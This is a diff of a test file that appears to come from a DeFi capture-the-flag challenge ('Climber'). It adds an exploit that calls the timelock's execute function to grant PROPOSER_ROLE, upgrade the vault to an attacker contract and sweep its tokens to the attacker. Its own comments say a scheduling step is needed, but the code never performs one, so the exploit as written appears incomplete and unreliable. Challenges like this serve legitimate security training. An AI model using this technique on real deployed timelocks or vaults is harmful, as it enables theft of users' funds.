@@ -51,8 +51,44 @@ describe('[Challenge] Climber', function () {
         await this.token.transfer(this.vault.address, VAULT_TOKEN_BALANCE);
     });
 
-    it('Exploit', async function () {        
+    it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        // Description induces the hacker to try to become the owner of the vault or at least the sweeper
+
+        // entry points: is the initializer modifier badly used in initialize() ?
+        // timelock does not have obvious entrypoints
+        // in timelock updatedelay() is useless 
+        // in timelock we can call execute but tx wil be reverted because of getOperationState(id) == OperationState.ReadyForExecution will never be true
+        // but we call before so we can call climbervault as owner, then on the way back of the call we will need to have scheduled an operation (as PROPOSER)
+
+        const ClimberAttacker = await ethers.getContractFactory('ClimberAttacker', attacker);
+        var upgradedVault = await ClimberAttacker.deploy();
+
+        await this.timelock.connect(attacker).execute(
+            // address[] calldata targets
+            [
+                this.timelock.address,
+                this.vault.address
+            ],
+            // uint256[] calldata values
+            [0, 0],
+            // bytes[] calldata dataElements
+            [
+                this.timelock.interface.encodeFunctionData("grantRole", [
+                    ethers.utils.keccak256(ethers.utils.toUtf8Bytes("PROPOSER_ROLE")),
+                    this.vault.address
+                ]),
+                this.vault.interface.encodeFunctionData("upgradeToAndCall", [
+                    upgradedVault.address,
+                    upgradedVault.interface.encodeFunctionData("sweep", [
+                        this.token.address,
+                        attacker.address
+                    ])
+                ])
+            ],
+            // bytes32 salt
+            ethers.utils.formatBytes32String("")
+        );
     });
 
     after(async function () {
